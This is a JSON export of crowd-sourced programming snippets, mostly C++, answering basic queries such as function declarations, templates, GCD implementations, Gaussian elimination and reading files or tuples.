    "description": "#include <iostream> using namespace std; //REMOVE COMMENTS TO USE VARIOUS FUNCTION CALLING METHODS // function declaration void swaper(int &,int&) ;// call  by reference //void swaper(int *,int * );// call by address //void swaper(int,int );//call by value   int main () {    // local variable declaration:    int a = 100;    int b = 200;    /* calling a function to swap the values using variable reference.*/    swaper(a, b);// call by reference    //swaper(&a, &b); //call by address    //swaper(a, b); // call by value    cout << \"After swap, value of a :\" << a << endl;    cout << \"After swap, value of b :\" << b << endl;     return 0; }  //CALL BY refernce DEFINATION void swaper(int &x, int &y) // x and y are ref variable..ie they are other name for a and b {    int temp;    temp = x; //save the value as x which is ref for a    x = y;    // put y into x    y = temp; // put x into y } //CALL BY ADD DEFINATION /*void swaper(int *x, int *y) {    int temp;    temp = *x; //save the value at address x    *x = *y;    // put y into x    *y = temp; // put x into y */  // CALL BY VALUE DEFINATION /* void swaper(int x, int y) {    int temp;    temp = x; // save the value of local x    x = y;    // put local y into local x    y = temp; //put local x into local y */   \n// function example #include <iostream> using namespace std;  int addition (int a, int b) {   int r;   r=a+b;   return r; }\nvoid Hello() {   std::cout << \"Hello\"; }  int main () {   Hello(); }\n#include <iostream> #include <stdlib.h> #include <iomanip> #include <fstream> using namespace std;  void function_one(double, double, double);  int main() {   double r1 = 1.0;   double r2 = 2.0;   double x = 0.0;   function_one(r1, r2, x);   return 0; }  void function_one(double rmin, double rmax, double x0) {   cout << \"Function got called\" << endl; }\n",
    "reg_date": "2021-10-12T11:40:18.000Z"
  },
  {
    "id": 2122,
    "keyword": null,
    "link": null,
    "title": " function declerations in C++",
    "description": "// function example #include <iostream> using namespace std;  int addition (int a, int b) {   int r;   r=a+b;   return r; }\n#include <iostream> #include <stdlib.h> #include <iomanip> #include <fstream> using namespace std;  void function_one(double, double, double);  int main() {   double r1 = 1.0;   double r2 = 2.0;   double x = 0.0;   function_one(r1, r2, x);   return 0; }  void function_one(double rmin, double rmax, double x0) {   cout << \"Function got called\" << endl; }\n",
    "reg_date": "2021-10-12T11:40:18.000Z"
  },
  {
    "id": 2123,
    "keyword": null,
    "link": null,
    "title": " function for searching in map in c++",
    "description": "//use this function unordered_map<int,int> m1;  m1.find(value of element you want to find);\n",
    "reg_date": "2021-10-12T11:40:18.000Z"
  },
  {
    "id": 2124,
    "keyword": null,
    "link": null,
    "title": " function in c++",
    "description": "// function example #include <iostream> using namespace std;  int addition (int a, int b) {   int r;   r=a+b;   return r; }\n#include <iostream>  using namespace std;  void function(){     cout << \"I am a function!\" << endl; }  int main() {     function();      return 0; }\nvoid Hello() {   std::cout << \"Hello\"; }  int main () {   Hello(); }\n//first lets create a function /*void is for starting something, anything after void will be the name of your function which will be followed by () */ void yourFunction() { //your code will be here, anything here will be the code in the yourFunction   cout << \"Functions\" } //now we have to go to our main function, the only function the compiler reads int main() {   myFunction(); //you call the function, the code we put in it earlier will be executed   return 0; }\n//Syntax     void myFunction() {      // code to be executed }    \n#include <iostream> using namespace std;  // Create a function void myFunction() {   cout << \"I just got executed!\"; }  int main() {   myFunction(); // call the function   return 0; }  // Outputs \"I just got executed!\"\n",
    "reg_date": "2021-10-12T11:40:18.000Z"
  },
  {
    "id": 2125,
    "keyword": null,
    "link": null,
    "title": " function in struct c++",
    "description": "struct Person {     char name[50];     int age;     float salary; };\nstruct foo {   int bar;   foo() : bar(3) {}   //look, a constructor   int getBar()    {      return bar;    } };  foo f; int y = f.getBar(); // y is 3\n",
    "reg_date": "2021-10-12T11:40:19.000Z"
  },
  {
    "id": 2126,
    "keyword": null,
    "link": null,
    "title": " function overriding in oop c++",
    "description": "#include<iostream> using namespace std; class Base {  public:  virtual void show() // virtual function  {   cout << \"Base class\";  } }; class Derived:public Base {  public:  void show()  {   cout << \"Derived Class\";  } };  int main() {  Base* b;       //Base class pointer  Derived d;     //Derived class object  b = &d;\t// passing derived class address into base class pointer\t  b->show();     //Late Binding Occurs }\n",
    "reg_date": "2021-10-12T11:40:19.000Z"
  },
  {
    "id": 2127,
    "keyword": null,
    "link": null,
    "title": " function prototype",
    "description": "/* Answer to: \"javascript prototype explained\" */  /*   The prototype object is special type of enumerable object to   which additional properties can be attached to it which will be   shared across all the instances of it's constructor function.    So, use prototype property of a function in the above example   in order to have age properties across all the objects as   shown below: */  function Student() {     this.name = 'John';     this.gender = 'M'; }  Student.prototype.age = 15;  var studObj1 = new Student(); alert(studObj1.age); // 15  var studObj2 = new Student(); alert(studObj2.age); // 15\n//simply prototype means superclass  function Student(name, age) {   this.name = name,   this.age = age; }  var stu1 = new Student(\"Wasi\", 20); var stu2 = new Student(\"Haseeb\", 25); //this class is add in all of the objects Student.prototype.class = \"Free Code Camp\";  console.log(stu1); console.log(stu2);  \nfunction Person(name) {   this.name = name; } Person.prototype.getName = function() {   return this.name; }  var person = new Person(\"John Doe\"); person.getName() //\"John Doe\"\n/*Prototype is used to add properties/methods to a  constructor function as in example below */  function ConstructorFunction(name){ \tthis.name = name //referencing to current executing object } ConstructorFunction.prototype.age = 18 let objectName = new ConstructorFunction(\"Bob\") console.log(objectName.age) //18\nfunction Person(first, last, age, eye) { this.firstName = first; this.lastName = last; this.age = age; this.eyeColor = eye; }  Person.prototype.nationality = \"English\";  var myFather = new Person(\"John\", \"Doe\", 50, \"blue\"); console.log(\"The nationality of my father is \" + myFather.nationality)\n// function prototype void add(int, int);  int main() {     // calling the function before declaration.     add(5, 3);     return 0; }  // function definition void add(int a, int b) {     cout << (a + b); }\n",
    "reg_date": "2021-10-12T11:40:19.000Z"
  },
  {
    "id": 2128,
    "keyword": null,
    "link": null,
    "title": " function prototype c++",
    "description": "int absval(int a); int gcd(int n1, int n2);\n",
    "reg_date": "2021-10-12T11:40:19.000Z"
  },
  {
    "id": 2129,
    "keyword": null,
    "link": null,
    "title": " function return floatin c++",
    "description": "#include <iostream>  float sum(float a, float b) {     return a+b; } int main(int argc, char *argv[]) {      float num1 = 10.2;     float num2 = 15.3;     float result = sum(num1,num2);     std::cout<< result;     return 0; } \n",
    "reg_date": "2021-10-12T11:40:19.000Z"
  },
  {
    "id": 2130,
    "keyword": null,
    "link": null,
    "title": " function return with int c++",
    "description": "#include <iostream>   int getValueFromUser() {  \tstd::cout << \"Enter an integer: \"; \tint input{}; \tstd::cin >> input;     \treturn input; }   int main() {     int x{ getValueFromUser() }; // first call to getValueFromUser     int y{ getValueFromUser() }; // second call to getValueFromUser       std::cout << x << \" + \" << y << \" = \" << x + y << '\\n';       return 0; } \n",
    "reg_date": "2021-10-12T11:40:19.000Z"
  },
  {
    "id": 2131,
    "keyword": null,
    "link": null,
    "title": " function template",
    "description": "template <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }\ntemplate <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }  void main() {   int a = 6;   int b = 42;   swap<int>(a, b);   printf(\"a=%d, b=%d\\n\", a, b);      // Implicit template parameter deduction   double f = 5.5;   double g = 42.0;   swap(f, g);   printf(\"f=%f, g=%f\\n\", f, g); }  /* Output: a=42, b=6 f=42.0, g=5.5 */\n#include <iostream> #include <string> using namespace std;   template <class calculator> //Template Definition  calculator addNumber(calculator A, calculator B) { \treturn A + B; }  int main() {  \tint\t\ta = 7,\t   b = 55;  \tfloat   x = 77.77, y = 8.99;  \tdouble  u = 4.44,  v = 7.88;  \tstring  i = \"My \", j = \"God!\";    \tstd::cout << addNumber(a, b) << endl;  \tstd::cout << addNumber(x, y) << endl;  \tstd::cout << addNumber(u, v) << endl;  \tstd::cout << addNumber(i, j) << endl; }  //Build Generic Function that can handle multiple type of data\n",
    "reg_date": "2021-10-12T11:40:19.000Z"
  },
  {
    "id": 2132,
    "keyword": null,
    "link": null,
    "title": " function template c++",
    "description": "template <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }\ntemplate <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }  void main() {   int a = 6;   int b = 42;   swap<int>(a, b);   printf(\"a=%d, b=%d\\n\", a, b);      // Implicit template parameter deduction   double f = 5.5;   double g = 42.0;   swap(f, g);   printf(\"f=%f, g=%f\\n\", f, g); }  /* Output: a=42, b=6 f=42.0, g=5.5 */\ntemplate class  Graph<string>;\n// template specialization #include <iostream> using namespace std;  // class template: template <class T> class mycontainer {     T element;   public:     mycontainer (T arg) {element=arg;}     T increase () {return ++element;} };  // class template specialization: template <> class mycontainer <char> {     char element;   public:     mycontainer (char arg) {element=arg;}     char uppercase ()     {       if ((element>='a')&&(element<='z'))       element+='A'-'a';       return element;     } };  int main () {   mycontainer<int> myint (7);   mycontainer<char> mychar ('j');   cout << myint.increase() << endl;   cout << mychar.uppercase() << endl;   return 0; }\ntemplate<class T1 , class T2> float fun(T1 a, T2 b){     float avg2 = (a+b)/2.0;     return avg2; }\n",
    "reg_date": "2021-10-12T11:40:19.000Z"
  },
  {
    "id": 2133,
    "keyword": null,
    "link": null,
    "title": " function to write a string in loercase in c++",
    "description": "/* tolower example */ #include <stdio.h> #include <ctype.h> int main () {   int i=0;   char str[]=\"Test String.\\n\";   char c;   while (str[i])   {     c=str[i];     putchar (tolower(c));     i++;   }   return 0; }\n",
    "reg_date": "2021-10-12T11:40:19.000Z"
  },
  {
    "id": 2134,
    "keyword": null,
    "link": null,
    "title": " functions in C++",
    "description": "// function example #include <iostream> using namespace std;  int addition (int a, int b) {   int r;   r=a+b;   return r; }\n#include <iostream>  using namespace std;  void function(){     cout << \"I am a function!\" << endl; }  int main() {     function();      return 0; }\nvoid Hello() {   std::cout << \"Hello\"; }  int main () {   Hello(); }\n// function returning the max between two numbers   int max(int num1, int num2) {    // local variable declaration    int result;      if (num1 > num2)       result = num1;    else       result = num2;      return result;  } \n#include <iostream> #include <stdlib.h> #include <iomanip> #include <fstream> using namespace std;  void function_one(double, double, double);  int main() {   double r1 = 1.0;   double r2 = 2.0;   double x = 0.0;   function_one(r1, r2, x);   return 0; }  void function_one(double rmin, double rmax, double x0) {   cout << \"Function got called\" << endl; }\n",
    "reg_date": "2021-10-12T11:40:19.000Z"
  },
  {
    "id": 2135,
    "keyword": null,
    "link": null,
    "title": " functions questions c++",
    "description": "#include<iostream> using namespace std;  int fib(int x) {     if(x == 0)     {         return 0;     }     else if(x==1)     {         return 1;     }     else     {         return fib(x-1)+fib(x-2);     } }  int main() {     cout << fib(0) << \"\\n\";     cout << fib(1) << \"\\n\";     cout << fib(2) << \"\\n\";     cout << fib(3) << \"\\n\";     cout << fib(4) << \"\\n\";     cout << fib(5) << \"\\n\";     return 0; }\t\t\t\t\t\t\t\t\t \n",
    "reg_date": "2021-10-12T11:40:20.000Z"
  },
  {
    "id": 2136,
    "keyword": null,
    "link": null,
    "title": " functors in c++",
    "description": "class Solution {   public :    \tint operator()(int n)  // overloading the operator ()     {         return n*n;      } }; int main() {   Solution solve; // making an function object   cout<<solve(3)<<\"\\n\"; // passing three as a parameter in the function object    } // output ->  9\n",
    "reg_date": "2021-10-12T11:40:20.000Z"
  },
  {
    "id": 2137,
    "keyword": null,
    "link": null,
    "title": " g++ -wall option meaning",
    "description": "-Wall (Compilation option): Produce warning messages about a number of things that are legal but dubious. I strongly suggest that you always specify this and that you treat every warning as an error to be fixed.\n",
    "reg_date": "2021-10-12T11:40:20.000Z"
  },
  {
    "id": 2138,
    "keyword": null,
    "link": null,
    "title": " g++ compile c++11",
    "description": "$ g++ -std=c++11 your_file.cpp -o your_program\n",
    "reg_date": "2021-10-12T11:40:20.000Z"
  },
  {
    "id": 2139,
    "keyword": null,
    "link": null,
    "title": " game loop SDL2",
    "description": "#include <SDL.h>           int main(int argc, char ** argv) {     bool quit = false;     SDL_Event event;       SDL_Init(SDL_INIT_VIDEO);       SDL_Window * window = SDL_CreateWindow(\"SDL2 Displaying Image\",         SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, 640, 480, 0);       while (!quit)     {         SDL_WaitEvent(&event);           switch (event.type)         {         case SDL_QUIT:             quit = true;             break;         }     }       SDL_Quit();       return 0; } \n",
    "reg_date": "2021-10-12T11:40:20.000Z"
  },
  {
    "id": 2140,
    "keyword": null,
    "link": null,
    "title": " gaussian elimination in c++",
    "description": "# TODO: Remove it\n#include <iostream> #include <cmath> #include <iomanip> using namespace std;  #define maximumCount 1000  int main() {     int n;     cout << \"Enter the order of matrix:\";     cin >> n;     float A[n][n+1];     float x[n];          for(int i=0;i<n;i++){         for(int j=0;j<n + 1;j++){         cout << \"Enter matrix at a[\" << i << \"]\" << \"[\" <<j << \"]\" << \": \" ;         cin >> A[i][j];         }     }       //Upper triangular matrux     for(int j=0;j<n;j++){         for(int i=0;i<n;i++){             if(i>j){                 float c = A[i][j] / A[j][j];                 for(int k=0;k<n+1;k++){                     A[i][k] = A[i][k] - c*A[j][k];                 }             }         }     }           //Dividing each row         for(int i=1;i<n;i++){             float c =  A[i][i];             for(int j=i;j<n+1;j++){                 A[i][j] = A[i][j] / c;             }          }     for(int i=0;i<n;i++){         for(int j=0;j<n+1;j++){             cout << A[i][j] << \" \";         }         cout << endl;     }            x[n-1] = A[n-1][n];          //backward substitution loop         for(int i=n-2;i>=0;i--){             float root = A[i][n];             for(int j = i+1; j<n ; j++){                 root -= A[i][j] * x[j];             }             x[i] = root;         }         x[0] = x[0] / A[0][0];         for(int i=0; i<n; i++){             cout << x[i] << endl;;         }            return 0; }  \n",
    "reg_date": "2021-10-12T11:40:20.000Z"
  },
  {
    "id": 2141,
    "keyword": null,
    "link": null,
    "title": " gaussian eliminaton c++",
    "description": "#include <iostream> #include <cmath> #include <iomanip> using namespace std;  #define maximumCount 1000  int main() {     int n;     cout << \"Enter the order of matrix:\";     cin >> n;     float A[n][n+1];     float x[n];          for(int i=0;i<n;i++){         for(int j=0;j<n + 1;j++){         cout << \"Enter matrix at a[\" << i << \"]\" << \"[\" <<j << \"]\" << \": \" ;         cin >> A[i][j];         }     }       //Upper triangular matrux     for(int j=0;j<n;j++){         for(int i=0;i<n;i++){             if(i>j){                 float c = A[i][j] / A[j][j];                 for(int k=0;k<n+1;k++){                     A[i][k] = A[i][k] - c*A[j][k];                 }             }         }     }           //Dividing each row         for(int i=1;i<n;i++){             float c =  A[i][i];             for(int j=i;j<n+1;j++){                 A[i][j] = A[i][j] / c;             }          }     for(int i=0;i<n;i++){         for(int j=0;j<n+1;j++){             cout << A[i][j] << \" \";         }         cout << endl;     }            x[n-1] = A[n-1][n];          //backward substitution loop         for(int i=n-2;i>=0;i--){             float root = A[i][n];             for(int j = i+1; j<n ; j++){                 root -= A[i][j] * x[j];             }             x[i] = root;         }         x[0] = x[0] / A[0][0];         for(int i=0; i<n; i++){             cout << x[i] << endl;;         }            return 0; }  \n",
    "reg_date": "2021-10-12T11:40:20.000Z"
  },
  {
    "id": 2142,
    "keyword": null,
    "link": null,
    "title": " gcc run c++",
    "description": "gcc test.cpp -lstdc++\n",
    "reg_date": "2021-10-12T11:40:20.000Z"
  },
  {
    "id": 2143,
    "keyword": null,
    "link": null,
    "title": " gcc suppress warning inline",
    "description": "#pragma GCC diagnostic push #pragma GCC diagnostic ignored \"-Wunused-parameter\"  void f(int a, int b) {     std::cout << a << '\\n';     // we are not using b! }  #pragma GCC diagnostic pop\n",
    "reg_date": "2021-10-12T11:40:20.000Z"
  },
  {
    "id": 2144,
    "keyword": null,
    "link": null,
    "title": " gcd",
    "description": "static int gcd(int a, int b)     {       if (b == 0)         return a;       return gcd(b, a % b);      }      \nint gcd(int a,int b) { \twhile (a&&b) a>b?a%=b:b%=a; \treturn a+b; }\nimport math  a = 10 b = 8 answer = math.gcd(10, 8) print(answer)\n//using euclid's theorem to find gcd #include <iostream>  using namespace std; int gcd(int x,int y) {     if(y==0)     {         return x;     }     return gcd(y,x%y); }  int main() {     ios_base::sync_with_stdio(false);     cin.tie(NULL);     int t;     cin>>t;     while(t--)     {         int a,b;         cin>>a>>b;         int ans=gcd(a,b);         cout<<ans<<endl;     }     return 0; } \nint gcd(int a,int b){     if(b==0) return a;     return gcd(b,a%b); }\nint gcd(int a, int b) {     while (b) b ^= a ^= b ^= a %= b;     return a; }\nimport java.util.Scanner; public class   Euclid {     static public void main(String[] argh){         System.out.print(\"Enter two numbers: \");         Scanner input = new Scanner(System.in);         int a = input.nextInt();         int b = input.nextInt();         int TEMP = 0 ;         int GCD = 0;         int max = a>b?a:b;         int min = a<b?a:b;         while(min!=0){             TEMP=(max%min);             GCD = min ;             min = TEMP;         }         System.out.print(\"(\"+GCD+\")\");     } }  \n",
    "reg_date": "2021-10-12T11:40:21.000Z"
  },
  {
    "id": 2145,
    "keyword": null,
    "link": null,
    "title": " gcd function c++",
    "description": "ll gcd(ll a, ll b) {     if (b==0)return a;     return gcd(b, a % b);    } \n#include<iostream> using namespace std; long long gcd(long long a, long long b)  {      if (b == 0)          return a;      return gcd(b, a % b);          }  int main() { \tlong long a,b; \tcin>>a>>b; \tcout<<gcd(a,b); }\nint gcd(int a, int b)  {      // Everything divides 0       if (a == 0)         return b;      if (b == 0)         return a;      // base case      if (a == b)          return a;      // a is greater      if (a > b)          return gcd(a-b, b);      return gcd(a, b-a);  }\n#include<iostream> using namespace std;  int euclid_gcd(int a, int b) { \tif(a==0 || b==0) return 0; \tint dividend = a; \tint divisor = b; \twhile(divisor != 0){ \t\tint remainder = dividend%divisor; \t\tdividend = divisor; \t\tdivisor = remainder; \t} \treturn dividend; }  int main() { \tcout<<euclid_gcd(0,7)<<endl; \tcout<<euclid_gcd(55,78)<<endl; \tcout<<euclid_gcd(105,350)<<endl; \tcout<<euclid_gcd(350,105)<<endl; \treturn 0; }\n#include <bits/stdc++.h> using namespace std;  int gcd(int a,int b){     if(a==0){         return b;     }     if(b==0){         return a;     }      if(a==b){         return a;     }      int x=0;     int mx = INT_MIN;     int mi = min(a,b);     for(int i=2;i<=mi;i++){         if(a%i==0 and b%i==0){             mx = max(mx,i);         }     }      return mx;  }  int main() {     int a = 36;     int b = 60;     cout<<gcd(a,b);  } \n",
    "reg_date": "2021-10-12T11:40:22.000Z"
  },
  {
    "id": 2146,
    "keyword": null,
    "link": null,
    "title": " gcd function in c++",
    "description": "#include<iostream> using namespace std; long long gcd(long long a, long long b)  {      if (b == 0)          return a;      return gcd(b, a % b);          }  int main() { \tlong long a,b; \tcin>>a>>b; \tcout<<gcd(a,b); }\nint gcd(int a, int b)  {      // Everything divides 0       if (a == 0)         return b;      if (b == 0)         return a;      // base case      if (a == b)          return a;      // a is greater      if (a > b)          return gcd(a-b, b);      return gcd(a, b-a);  }\n#include<iostream> using namespace std;  int euclid_gcd(int a, int b) { \tif(a==0 || b==0) return 0; \tint dividend = a; \tint divisor = b; \twhile(divisor != 0){ \t\tint remainder = dividend%divisor; \t\tdividend = divisor; \t\tdivisor = remainder; \t} \treturn dividend; }  int main() { \tcout<<euclid_gcd(0,7)<<endl; \tcout<<euclid_gcd(55,78)<<endl; \tcout<<euclid_gcd(105,350)<<endl; \tcout<<euclid_gcd(350,105)<<endl; \treturn 0; }\n#include <stdio.h> int main() {     int t, n1, n2, gcd;      scanf(\"%d\", &t); // Test Case Input     while (t--)     {         scanf(\"%d %d\", &n1, &n2);// Taking numbers input          if (n2 > n1)         {              gcd = n1;             n1 = n2;             n2 = gcd;         }         while (n1 % n2 != 0)         {             gcd = n2;             n2 = n1 % n2;             n1 = gcd;          }         // n2 is our gcd         printf(\"GCD: %d\\n\", n2);     }     return 0; }\n",
    "reg_date": "2021-10-12T11:40:22.000Z"
  },
  {
    "id": 2147,
    "keyword": null,
    "link": null,
    "title": " gcd in c++",
    "description": "#include<iostream> using namespace std; long long gcd(long long a, long long b)  {      if (b == 0)          return a;      return gcd(b, a % b);          }  int main() { \tlong long a,b; \tcin>>a>>b; \tcout<<gcd(a,b); }\nint gcd(int a, int b)  {      // Everything divides 0       if (a == 0)         return b;      if (b == 0)         return a;      // base case      if (a == b)          return a;      // a is greater      if (a > b)          return gcd(a-b, b);      return gcd(a, b-a);  }\n#include<iostream> using namespace std;  int euclid_gcd(int a, int b) { \tif(a==0 || b==0) return 0; \tint dividend = a; \tint divisor = b; \twhile(divisor != 0){ \t\tint remainder = dividend%divisor; \t\tdividend = divisor; \t\tdivisor = remainder; \t} \treturn dividend; }  int main() { \tcout<<euclid_gcd(0,7)<<endl; \tcout<<euclid_gcd(55,78)<<endl; \tcout<<euclid_gcd(105,350)<<endl; \tcout<<euclid_gcd(350,105)<<endl; \treturn 0; }\ncout << __gcd(17, 97) << endl; //#include <algorithm>  \n",
    "reg_date": "2021-10-12T11:40:22.000Z"
  },
  {
    "id": 2148,
    "keyword": null,
    "link": null,
    "title": " gcd of two numbers c++",
    "description": "// gcd function definition below: int gcd(int a, int b) {    if (b == 0)    return a;    return gcd(b, a % b); }  int a = 105, b = 30; cout<<\"GCD of \"<< a <<\" and \"<< b <<\" is \"<< gcd(a, b); // output = \"GCD of 105 and 30 is 15\";\n#include<iostream> using namespace std; long long gcd(long long a, long long b)  {      if (b == 0)          return a;      return gcd(b, a % b);          }  int main() { \tlong long a,b; \tcin>>a>>b; \tcout<<gcd(a,b); }\nint gcd(int a, int b)  {      // Everything divides 0       if (a == 0)         return b;      if (b == 0)         return a;      // base case      if (a == b)          return a;      // a is greater      if (a > b)          return gcd(a-b, b);      return gcd(a, b-a);  }\n",
    "reg_date": "2021-10-12T11:40:23.000Z"
  },
  {
    "id": 2149,
    "keyword": null,
    "link": null,
    "title": " gcd recursion c++",
    "description": "int gcd(int a, int b){    if(b==0)       return a;     return gcd(b, a % b); }\n",
    "reg_date": "2021-10-12T11:40:23.000Z"
  },
  {
    "id": 2150,
    "keyword": null,
    "link": null,
    "title": " gcd using cpp",
    "description": "int gcd(int a, int b)  {      // Everything divides 0       if (a == 0)         return b;      if (b == 0)         return a;      // base case      if (a == b)          return a;      // a is greater      if (a > b)          return gcd(a-b, b);      return gcd(a, b-a);  }\n#include <bits/stdc++.h> using namespace std;  int gcd(int a,int b){     if(a==0){         return b;     }     if(b==0){         return a;     }      if(a==b){         return a;     }      int x=0;     int mx = INT_MIN;     int mi = min(a,b);     for(int i=2;i<=mi;i++){         if(a%i==0 and b%i==0){             mx = max(mx,i);         }     }      return mx;  }  int main() {     int a = 36;     int b = 60;     cout<<gcd(a,b);  } \n",
    "reg_date": "2021-10-12T11:40:23.000Z"
  },
  {
    "id": 2151,
    "keyword": null,
    "link": null,
    "title": " gdb get return value of function",
    "description": "int fun() { \treturn 42; }  int main() { \tfun();     return 0; }  (gdb) break 2   // set breakpoint at line 2 (gdb) r  Breakpoint 1, fun () at test.c:2 2               return 42;  (gdb) finish   // $1 is the value the function returned.  Run till exit from #0  fun () at test.c:2 main () at test.c:7 7               return 0; Value returned is $1 = 42   // we get the return value is 42 \n",
    "reg_date": "2021-10-12T11:40:23.000Z"
  },
  {
    "id": 2152,
    "keyword": null,
    "link": null,
    "title": " generate random double c++",
    "description": "double fRand(double fMin, double fMax) {     double f = (double)rand() / RAND_MAX;     return fMin + f * (fMax - fMin); }\n",
    "reg_date": "2021-10-12T11:40:23.000Z"
  },
  {
    "id": 2153,
    "keyword": null,
    "link": null,
    "title": " generate random string in c++",
    "description": "#include <random> #include <string>  std::string random_string() {      std::string str(\"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\");       std::random_device rd;      std::mt19937 generator(rd());       std::shuffle(str.begin(), str.end(), generator);       return str.substr(0, 32);    // assumes 32 < number of characters in str          } \n",
    "reg_date": "2021-10-12T11:40:23.000Z"
  },
  {
    "id": 2154,
    "keyword": null,
    "link": null,
    "title": " generating unique id for an object in c++",
    "description": "int id = reinterpret_cast<int>(&obj); \nint id = (int)&obj; \n",
    "reg_date": "2021-10-12T11:40:24.000Z"
  },
  {
    "id": 2155,
    "keyword": null,
    "link": null,
    "title": " gestd::getline with wstring",
    "description": "std::wstring input; std::getline(std::wcin, input);\n",
    "reg_date": "2021-10-12T11:40:24.000Z"
  },
  {
    "id": 2156,
    "keyword": null,
    "link": null,
    "title": " get a string from file in c++",
    "description": "std::getline(nameFileout, item_name) \n",
    "reg_date": "2021-10-12T11:40:24.000Z"
  },
  {
    "id": 2157,
    "keyword": null,
    "link": null,
    "title": " get an array with c++",
    "description": "int arr[5]; for(int i=0;i<5;i++) {   cin>>arr[i]; }\n",
    "reg_date": "2021-10-12T11:40:24.000Z"
  },
  {
    "id": 2158,
    "keyword": null,
    "link": null,
    "title": " get ascii value of qchar",
    "description": "QString test(\"test\"); QChar c = test.at(0); int v_latin = c.toLatin1(); // for QT > 5 int v_ascii = c.toAscii(); // for QT <= 5 [DEPRECATED]\n",
    "reg_date": "2021-10-12T11:40:24.000Z"
  },
  {
    "id": 2159,
    "keyword": null,
    "link": null,
    "title": " get ascii value of string in C++",
    "description": "#include<iostream> using namespace std; int main () {     char c;     cout << \"Enter a character : \";     cin >> c;     cout << \"ASCII value of \" << c <<\" is :  \" << (int)c;     return 0; }\n#include<iostream.h> #include<conio.h> void main() {   char a;   clrscr();   cout<<\"\\nEnter any key: \";   cin>>a;   cout<<\"ASCII value of \"<<a<<\" is: \"<<int(a);   getch(); }\nint main() {  char *s=\"hello\";  while(*s!='\\0')   {   printf(\"%c --> %d\\n\",*s,*s);   s++;   }  return 0; }\n",
    "reg_date": "2021-10-12T11:40:25.000Z"
  },
  {
    "id": 2160,
    "keyword": null,
    "link": null,
    "title": " get bitshift to wrap c++",
    "description": "//Rotating integers are done as follows letter = ((unsigned char)letter >> 1) | (letter << 7);\n",
    "reg_date": "2021-10-12T11:40:25.000Z"
  },
  {
    "id": 2161,
    "keyword": null,
    "link": null,
    "title": " get current date in c++",
    "description": "#include <ctime> #include <iostream>  int main() {     std::time_t t = std::time(0);   // get time now     std::tm* now = std::localtime(&t);     std::cout << (now->tm_year + 1900) << '-'           << (now->tm_mon + 1) << '-'          <<  now->tm_mday          << \"\\n\"; }\n#include <string> #include <sstream> #include <iostream>  time_t t = time(0);   // get time now struct tm * now = localtime( & t );  ostringstream osTime; osTime << (now->tm_year + 1900) <<    (now->tm_mon + 1) <<    now->tm_mday <<    \"\\n\";  cout << osTime.str();\n",
    "reg_date": "2021-10-12T11:40:25.000Z"
  },
  {
    "id": 2162,
    "keyword": null,
    "link": null,
    "title": " get data from terminal c++",
    "description": "// Just some basic format   #include <iostream> #include <string> using namespace std;  int main() {  cout << \"Print a String\" << endl;  }\n// cin with strings #include <iostream> #include <string> using namespace std;  int main () {   string mystr;   cout << \"What's your name? \";   getline (cin, mystr);   cout << \"Hello \" << mystr << \".\\n\";   cout << \"What is your favorite team? \";   getline (cin, mystr);   cout << \"I like \" << mystr << \" too!\\n\";   return 0; }\nint age; cin >> age;\n  int i;   cout << \"Please enter an integer value: \";   cin >> i;\n",
    "reg_date": "2021-10-12T11:40:25.000Z"
  },
  {
    "id": 2163,
    "keyword": null,
    "link": null,
    "title": " get elements of 2d array c++",
    "description": "#include <array> 2 #include <iostream> 3 4 using namespace std; 5 6 //remember const! 7 const int ROWS = 2; 8 const int COLS = 3; 9 10 void printMatrix(array<array<int, COLS>, ROWS> matrix){ 11 //for each row 12 for (int row = 0; row < matrix.size(); ++row){ 13 //for each element in the current row 14 for (int col = 0; col < matrix[row].size(); ++col){ 15 cout << matrix[row][col] << ' '; 16 } 17 cout << endl; 18 } 19 }\nvoid printMatrix(array<array<int, COLS>, ROWS> matrix){ for (auto row : matrix){ //auto infers that row is of type array<int, COLS> for (auto element : row){ cout << element << ' '; } cout << endl; }\n",
    "reg_date": "2021-10-12T11:40:25.000Z"
  },
  {
    "id": 2164,
    "keyword": null,
    "link": null,
    "title": " get elements of tuple c++",
    "description": "#include <tuple> #include <iostream> int main() {     auto t = std::make_tuple(1, \"Foo\", 3.14);     // index-based access     std::cout << \"(\" << std::get<0>(t) << \", \" << std::get<1>(t)               << \", \" << std::get<2>(t) << \")\\n\"; }\n",
    "reg_date": "2021-10-12T11:40:25.000Z"
  },
  {
    "id": 2165,
    "keyword": null,
    "link": null,
    "title": " get files in directory c++",
    "description": "#include <string> #include <iostream> #include <filesystem> namespace fs = std::filesystem;  int main() {     std::string path = \"/path/to/directory\";     for (const auto & entry : fs::directory_iterator(path))         std::cout << entry.path() << std::endl; }\n#include <dirent.h>  std::vector<std::string> GetRecords() {     std::vector<std::string> files;     struct dirent *entry; \tDIR *dir = opendir(record_dir_path.c_str());  \tif (dir == NULL)  \t{ \t  return files; \t} \twhile ((entry = readdir(dir)) != NULL)  \t{ \t\tfiles.push_back(entry->d_name); \t} \tclosedir(dir); \t \treturn files; }\n",
    "reg_date": "2021-10-12T11:40:26.000Z"
  },
  {
    "id": 2166,
    "keyword": null,
    "link": null,
    "title": " get first and last character of string c++",
    "description": "auto first_char = str.front() auto last_char = str.back()\n",
    "reg_date": "2021-10-12T11:40:26.000Z"
  },
  {
    "id": 2167,
    "keyword": null,
    "link": null,
    "title": " get first element of tuple c++",
    "description": "#include <iostream> #include <string> #include <tuple>   auto t = std::make_tuple(1, \"Foo\", 3.14); // index-based access std::cout << \"(\" << std::get<0>(t) << \", \" << std::get<1>(t)<< \", \" << std::get<2>(t) << \")\\n\"; // type-based access (C++14 or later) std::cout << \"(\" << std::get<int>(t) << \", \" << std::get<const char*>(t) << \", \" << std::get<double>(t) << \")\\n\"; \n",
    "reg_date": "2021-10-12T11:40:26.000Z"
  },
  {
    "id": 2168,
    "keyword": null,
    "link": null,
    "title": " get index by pointer to element of vector c++",
    "description": "std::vector<MyObject> vect; MyObject *ptrX = ... // Pointer to element ptrdiff_t index = ptrX - &vect[0];\n",
    "reg_date": "2021-10-12T11:40:26.000Z"
  },
  {
